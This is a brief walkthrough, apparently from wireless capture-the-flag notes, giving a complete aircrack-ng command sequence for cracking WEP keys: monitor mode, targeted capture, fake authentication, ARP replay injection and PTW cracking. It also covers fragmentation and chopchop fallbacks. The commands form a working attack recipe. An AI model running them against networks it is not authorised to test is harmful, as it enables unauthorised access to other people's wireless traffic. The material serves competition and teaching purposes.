# WEP walkthrough — crack in under a minute

**Verified against:** aircrack-ng 1.7 as of 2026-Q3

```
# 1. Monitor mode.
airmon-ng start wlan1

# 2. Start capturing on the target channel + BSSID.
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep-cap wlan1mon &

# 3. Fake-associate (needed for injection).
aireplay-ng --fakeauth 0 -a AA:BB:CC:DD:EE:FF wlan1mon

# 4. Wait for one ARP request from a client, then replay it forever
#    to generate fresh IVs at line rate.
aireplay-ng --arpreplay -b AA:BB:CC:DD:EE:FF wlan1mon

# 5. Once ~40k IVs are captured, crack (PTW is the default).
aircrack-ng wep-cap-01.cap
```

The recovered key is the WEP shared secret. In a WCTF that string
is often the flag directly, or decrypts a capture that contains
the flag.

## Failure modes

- **No client on the network.** No ARP to replay. Fall back to
  fragmentation attack (`aireplay --fragment`) or chopchop
  (`aireplay --chopchop`) to synthesize an ARP.
- **Injection not working.** Adapter chipset does not support
  monitor+injection reliably. See `hardware-and-antennas` (not
  yet written) — ath9k works; many Realtek do not.

## Cite

- aircrack-ng documentation — WEP tutorial.
- attacks.json: `wep-ptw`, `wep-arp-request-replay`.
